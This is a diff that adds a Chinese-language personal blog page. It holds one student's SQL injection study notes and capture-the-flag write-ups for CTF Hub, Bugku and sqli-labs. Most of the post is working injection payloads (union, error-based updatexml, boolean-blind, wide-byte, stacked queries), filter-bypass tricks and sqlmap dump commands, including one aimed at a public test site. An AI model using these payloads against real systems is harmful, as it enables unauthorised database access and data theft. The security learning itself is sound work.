@@ -1,0 +1,493 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || sql注入</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>哒哒哒哒哒~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>sql注入 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/8/21
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/基础漏洞之——sql注入" style=color:#1bccbc>
+                    基础漏洞之——sql注入
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>sql注入是我一边刷着题一边学的，所以这里基本就只有wp，总结很少</p>
+<span id="more"></span>
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p><strong>CTF Hub——SQL注入–整型注入</strong></p>
+<blockquote>
+<ol>
+<li>检查是否存在注入： and语句 ——  and 1=1 返回正确  ||  and 1=2 返回错误 </li>
+<li>使用<strong>order by</strong>语句查询字段数  参数为3时没有显示 说明字段数为2</li>
+<li>通过语句<strong>id=-1 union select 1,database()</strong>  获得当前数据库名  ||  <strong>select group_concat(SCHEMA_NAME) from information_schema.schemata</strong>  获得所有数据库名</li>
+<li>通过语句<strong>id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=’sqli’</strong>  获得当前表名  ||  ‘sqli’可以换成database()</li>
+<li>通过语句<strong>union select 1,group_concat(column_name) from information_schema.columns where table_schema=’sqli’ and table_name=’flag’</strong>  获得表中所有列名</li>
+<li>通过语句<strong>id=-1 union select 1,group_concat(flag) from sqli.flag</strong>  获得指定数据库的表的列的内容</li>
+<li>得到flag</li>
+</ol>
+</blockquote>
+<p><strong>CTF Hub——SQL注入–字符型注入</strong></p>
+<blockquote>
+<p>跟整型注入差不多，就是单引号有点儿烦人，使用  <strong>#</strong>  注释引号  |  hackbar里写#不知道为啥竟然不行  转成url编码格式<code>%23</code></p>
+</blockquote>
+<p><strong>Bugku CTF——成绩查询–字符型注入</strong></p>
+<blockquote>
+<ol>
+<li>数据库：<strong>skctf</strong></li>
+<li>表：<strong>fl4g,sc</strong></li>
+<li>列：<strong>skctf_flag</strong></li>
+</ol>
+</blockquote>
+<p><strong>CTF Hub——SQL注入–报错注入</strong></p>
+<blockquote>
+<p>原理：</p>
+<ul>
+<li>使用<strong>updatexml(XML_document, XPath_string, new_value)<strong>函数，合法情况则用第三个参数替换，非法情况则会报错并带出查询的结果  |  根据</strong>xpath</strong>语法规则， <strong>~</strong> 是非法字符——ASCLL码为：<strong>0x7e</strong></li>
+<li>使用<strong>left</strong>和<strong>right</strong>函数，获得完整的flag<ul>
+<li>left():  从左开始截取字符串    left(str, length) ——&gt;left(被截取字符串， 截取长度)</li>
+<li>right():  从右开始截取字符串    right(str, length) ——&gt;right(被截取字符串， 截取长度)</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>检查是否为报错注入：输入1显示查询正确 输入abc查询错误且显示报错信息</li>
+<li>使用<strong>updatexml</strong>函数来获取信息</li>
+<li>通过语句<strong>id=-1 union select updatexml(1,concat(0x7e,database(),0x7e),1)</strong>  回显报错信息查询到数据库名 </li>
+<li>通过语句<strong>id=-1 union select updatexml(1,concat(0x7e, (select(group_concat(table_name))from information_schema.tables where table_schema=”sqli”) ,0x7e),1)</strong> 回显报错信息查询到表名</li>
+<li>通过语句<strong>id=-1 union select updatexml(1,concat(0x7e, (select(group_concat(column_name))from information_schema.columns where table_name=”flag”) ,0x7e),1)</strong>  查询flag表中的列</li>
+<li>通过语句<strong>id=-1 union select updatexml(1,concat(0x7e, (select(group_concat(flag)) from sqli.flag) ,0x7e),1)</strong> 查询flag</li>
+<li>但是但是但是！这个flag还不全，因为updatexml函数查询出的结果显示长度限制为32位 ，所以还要借助right函数：<strong>id=-1 union select updatexml(1,concat(0x7e, right((select(group_concat(flag)) from sqli.flag) ,31),0x7e),1)</strong> 查询右半段flag</li>
+</ol>
+</blockquote>
+<p><strong>CTF Hub——SQL注入–MySQL结构</strong></p>
+<blockquote>
+<p>基本和整型注入一样，但是改掉了表和列的名字</p>
+<p>表：<strong>cqbhiiviny</strong>   列：<strong>tnorsxhwej</strong></p>
+<p>直接用整型注入的套路，得到flag</p>
+</blockquote>
+<p><strong>CTF Hub——SQL注入–过滤空格</strong></p>
+<blockquote>
+<p>和整型差不多，但是不能存在空格</p>
+<ol>
+<li>输入存在空格的时候显示  Hacker!!!  ，可以用x’c’c表名：<strong>cdmznubhwv</strong></li>
+<li>列名：<strong>jdmex-hpswv</strong></li>
+<li>得到flag</li>
+</ol>
+</blockquote>
+<p>布尔盲注和时间盲注用手工注入太麻烦了，懒得写，我觉得应该稍微了解就行吧 (</p>
+<p><strong>CTF Hub——SQL注入–Cookie注入</strong></p>
+<blockquote>
+<p>（啊要用bp了都忘得差不多了）</p>
+<ol>
+<li>用<strong>bp</strong>或者用<strong>hackbar</strong>都可以</li>
+<li>然后就是快乐的整型注入模板，后边的UA和Refer也都差不多</li>
+<li>表：<strong>jivbcjahiu</strong></li>
+<li>列：<strong>moyccjdoqr</strong></li>
+<li>得到flag</li>
+</ol>
+</blockquote>
+<p>[^UA]: User-Agent 即用户代理，简称“UA”，它是一个特殊字符串头。网站服务器通过识别 “UA”来确定用户所使用的操作系统版本、CPU 类型、浏览器版本等信息。而网站服务器则通过判断 UA 来给客户端发送不同的页面。</p>
+<p><strong>CTF Hub——SQL注入–UA注入</strong></p>
+<blockquote>
+<ol>
+<li>表：<strong>zfdtopgual</strong></li>
+<li>列：<strong>rgotgomxjd</strong></li>
+</ol>
+</blockquote>
+<p>[^Refer]: Referer 表示请求的来源，比如什么网站经过链接跳转过来的，是 HTTP 请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含 Referer。</p>
+<p><strong>CTF Hub——SQL注入–Refer注入</strong></p>
+<blockquote>
+<ol>
+<li>表：<strong>tgedamzdxj</strong></li>
+<li>列：<strong>bllnvpjpks</strong></li>
+</ol>
+</blockquote>
+<p><strong>sqli-labs-32——宽字节注入</strong></p>
+<blockquote>
+<p><strong>原理：</strong></p>
+<p>宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围），<code>%df’</code> 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠 \，变成了 %df\’，其中 \ 的十六进制是 %5c ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了</p>
+<ol>
+<li>宽字节注入大概可以理解为， <code>‘</code> 会被转为 <code>\&#39;</code>，当存在宽字节注入的时候，注入参数里带入<code>％df％27</code>，即可把<code>\(％5c)</code>吃掉</li>
+<li><code>id=%df%27||id=%df&#39;</code>，其余跟字符型注入一样</li>
+</ol>
+</blockquote>
+<p><strong>sqli-labs-38——堆叠注入</strong></p>
+<blockquote>
+<ol>
+<li>同时执行多条语句，用 <strong><code>;</code></strong> 分隔，可执行任意语句</li>
+<li>如：<strong>id=1’;insert into users(id,username,password) value (99,’kk’,’123456’);%23</strong>  执行向数据表中增加信息操作</li>
+<li>可以通过<strong>id=1’;select 1,2,database()</strong>  查询数据库</li>
+</ol>
+</blockquote>
+<p><strong>布尔盲注😭</strong></p>
+<blockquote>
+<p>要用到的函数及原理：</p>
+<ul>
+<li><strong>ascii函数：</strong>返回字符ascii码值|参数 : str单字符</li>
+<li><strong>length函数：</strong>返回字符串的长度|参数 : str 字符串</li>
+<li><strong>left函数：</strong>返回从左至右截取固定长度的字符串|参数str,length——str : 字符串、length：截取长度</li>
+<li><strong>substr()/substring函数 ：</strong> 返回从pos位置开始到length长度的子字符串|参数，str，pos，length——str: 字符串、pos：开始位置、length： 截取长度——原理：在构造SQL语句之时，and后面如果跟着一个大于0的数，那么SQL语句正确执行，可以利用此特性，使用substr截取字符，当截取的字符不存在，再通过ascii函数处理之后将会变成false，页面将回显错误</li>
+</ul>
+<p>注入流程：</p>
+<ol>
+<li><p>求当前数据库长度：<strong>id=1 and (length(database())=8)</strong>  || 也可以使用 &gt; 、&lt; 符号来进一步缩小范围</p>
+</li>
+<li><p>求当前数据库名：</p>
+<ul>
+<li>判断截取字符是否存在：<strong>id=1 and ascii(substr(database(),8,1))</strong></li>
+<li>从左至右截取一个字符：<strong>id=1 and (left(database(),1)=’s’)</strong>||从左至右截取两个字符：<strong>id=1 and (left(database(),2)=’se’)</strong></li>
+<li>截取字符判断字符的ascii码从而确定字符：id=1 and (ascii(substr(database(),1,1))=115)||id=1 and (ascii(substr(database(),2,1))=101)，可以使用 &gt;，&lt; 符号来比较查找，找到一个范围，最后再确定</li>
+</ul>
+</li>
+<li><p>求当前数据库中表的个数：<strong>id=1 and (select count(table_name) from information_schema.tables where table_schema=database())=4</strong></p>
+</li>
+<li><p>求当前数据库中其中一个表名的长度：<strong>id=1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6</strong></p>
+</li>
+<li><p>求当前数据库中其中一个表名：</p>
+<p><strong>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101</strong>–e||<strong>id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=’e’</strong> </p>
+</li>
+<li><p>求列名的数量：<strong>id=1 and (select count(column_name) from information_schema.columns where table_name=’emails’)=3</strong></p>
+</li>
+<li><p>求列名的长度：<strong>id=1 and (select length(column_name) from information_schema.columns where table_name=’emails’ limit 0,1)=2</strong></p>
+</li>
+<li><p>求列名：<strong>id=1 and ascii(substr((select column_name from information_schema.columns where table_name=’emails’ limit 0,1),1,1)) = 105</strong>||<strong>id=1 and substr((select column_name from information_schema.columns where table_name=’emails’ limit 2,1),1,4)=’flag’</strong></p>
+</li>
+<li><p>求字段的数量：<strong>id=1 and (select count(flag) from emails)=1</strong></p>
+</li>
+<li><p>求字段内容的长度：<strong>id=1 and (select length(flag) from security.emails limit 0,1)=14</strong></p>
+</li>
+<li><p>求字段内容：<strong>id=1 and ascii(substr((select flag from emails  limit 0,1),1,1))=68</strong>||<strong>id=1 and substr((select flag from emails  limit 0,1),1,14)=’flag{sqlyyds!}’</strong></p>
+</li>
+</ol>
+<p>总结：还是比较喜欢用substr函数，可以一下猜一串</p>
+</blockquote>
+<p><strong>常见绕过（虽然但是大部分还没有遇到）</strong></p>
+<blockquote>
+<ul>
+<li>绕过空格（注释符/**/，%20）</li>
+<li>括号绕过空格</li>
+<li>引号绕过（使用十六进制）</li>
+<li>逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）</li>
+<li>比较符号（&lt; &gt;）绕过（使用greatest()）</li>
+<li>or and 绕过</li>
+<li>绕过注释符号（#，–）过滤</li>
+<li>= 绕过 （like）</li>
+<li>通用绕过（编码）</li>
+</ul>
+</blockquote>
+<h3 id="手工注入总结"><a href="#手工注入总结" class="headerlink" title="手工注入总结"></a>手工注入总结</h3><blockquote>
+<ol>
+<li><strong>column_name</strong>: 列的名称</li>
+<li><strong>information_schema.columns</strong>: 表示所有的列的信息</li>
+<li><strong>information_schema</strong>: 表示所有信息，包括库、表、列</li>
+<li><strong>information_schema.tables</strong>: 表示所有的表的信息</li>
+<li><strong>table_schema</strong>: 数据库的名称</li>
+<li><strong>table_name</strong>: 表的名称</li>
+<li>获得当前数据库名：<strong>union selcet 1,database()</strong></li>
+<li>获得当前表名：<strong>union select 1,group_concat(table_name)from information_schema.tables where table_schema=’<code>&lt;数据库名&gt;</code>‘</strong> </li>
+<li>获得表中的列名：<strong>union select 1,group_concat(column_name) from information_schema.columns where table_schema=’<code>&lt;数据库名&gt;</code>‘ and table_name=’<code>&lt;表名&gt;</code>‘</strong></li>
+<li>获得指定列的内容：<strong>union select 1,group_concat(<code>&lt;列名&gt;</code>) from <code>&lt;数据库名&gt;</code>.<code>&lt;表名&gt;</code></strong></li>
+</ol>
+</blockquote>
+<h3 id="SQLmap注入"><a href="#SQLmap注入" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h3><p><strong>CTF Hub——SQL注入–布尔盲注</strong></p>
+<blockquote>
+<ol>
+<li><strong>sqlmap.py -u <code>&lt;目标URL&gt;</code> –dbs</strong>  列出数据库名</li>
+<li><strong>sqlmap.py -u <code>&lt;目标URL&gt;</code> -D <code>&lt;sqli(数据库名)&gt;</code> –tables</strong>  列出指定数据库的表名</li>
+<li><strong>sqlmap.py -u <code>&lt;目标URL&gt;</code> -D <code>&lt;sqli(数据库名)&gt;</code>  -T <code>&lt;flag（表名）&gt;</code> –columns</strong>   列出指定数据库的列名</li>
+<li><strong>sqlmap.py -u <code>&lt;目标URL&gt;</code> -D <code>&lt;sqli(数据库名)&gt;</code>  -T <code>&lt;flag（表名）&gt;</code> -C <code>&lt;flag（列名）&gt;</code> –dump</strong>   从目标表中得到数据</li>
+</ol>
+</blockquote>
+<p><strong>CTF Hub——SQL注入–时间盲注</strong></p>
+<blockquote>
+<p>和布尔盲注一个套路，就不写咯，但是真的好慢啊……</p>
+</blockquote>
+<p><strong>Bugku——SQL注入</strong></p>
+<blockquote>
+<ol>
+<li>一个登录界面，不小心猜到了密码这这这   傻眼.jpg   做题体验 -1-1-1 快乐+1+1+1</li>
+<li>是个布尔盲注题，看别人wp都是自己写脚本，但是我不会</li>
+</ol>
+</blockquote>
+<p><strong>利用SQLmap进行Post注入</strong></p>
+<blockquote>
+<ul>
+<li>靶场：<a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></li>
+<li>bp抓包，将拦截到的post请求存为txt，放在sqlmap文件夹下（也可以放到别的地方，都随意）</li>
+<li>sqlmap.py -r <code>&lt;txt路径&gt;</code> -p <code>&lt;tfUPass（参数名）&gt;</code> –dbs  列出数据库名 || -r表示加载一个文件，-p指定参数</li>
+<li>接下来就是套路都是套路</li>
+</ul>
+</blockquote>
+<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><ul>
+<li>学到了很重要的一点就是什么东西最好还是自己多试试，很多人说新版PHP study搭建不了，然鹅并不是，害得我删掉了之前的找了个不怎么好用的旧版，本人已经被气死了，重新下载新版发现根本就是可以用的！！！！无良作者真的害死人！呜呜呜呜之前好不容易弄的数据库也没了QAQ</li>
+<li>好多题呀…emmm目前打算是有空就做点（英文界面实在不是很友好） </li>
+</ul>
+<p><strong>做题记录：</strong></p>
+<p><strong>page1</strong>：</p>
+<ol>
+<li>字符型注入</li>
+<li>报错注入</li>
+<li>字符型注入多了一个括号–要学会看懂报错</li>
+</ol>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
